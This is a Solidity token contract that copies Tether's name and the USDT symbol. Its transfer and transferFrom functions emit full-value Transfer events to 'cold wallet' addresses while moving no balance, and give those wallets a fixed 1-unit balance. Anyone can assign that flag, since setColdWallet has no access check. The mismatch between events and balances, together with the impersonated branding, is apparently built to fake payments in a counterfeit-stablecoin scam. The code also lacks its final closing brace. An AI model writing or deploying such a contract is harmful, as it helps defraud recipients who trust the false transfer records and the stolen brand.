// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AiUSDT {
    string public name = "TetherUS";
    string public symbol = "USDT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 800_000_000 * 10 ** uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public isColdWallet;
    mapping(address => uint256) public coldWalletBalance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event ColdWalletSet(address indexed wallet, bool status);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setColdWallet(address _wallet, bool _status) public {
        isColdWallet[_wallet] = _status;
        if (_status) {
            coldWalletBalance[_wallet] = 1 * 10 ** uint256(decimals); // قيمة ثابتة 1 دولار
        } else {
            coldWalletBalance[_wallet] = 0;
        }
        emit ColdWalletSet(_wallet, _status);
    }

    function getBalance(address _owner) public view returns (uint256) {
        if (isColdWallet[_owner]) {
            return coldWalletBalance[_owner];
        }
        return balanceOf[_owner];
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        
        if (isColdWallet[_to]) {
            coldWalletBalance[_to] = 1 * 10 ** uint256(decimals);
        } else {
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
        }

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid address");
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");
        
        if (isColdWallet[_to]) {
            coldWalletBalance[_to] = 1 * 10 ** uint256(decimals);
        } else {
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            allowance[_from][msg.sender] -= _value;
        }

        emit Transfer(_from, _to, _value);
        return true;
}
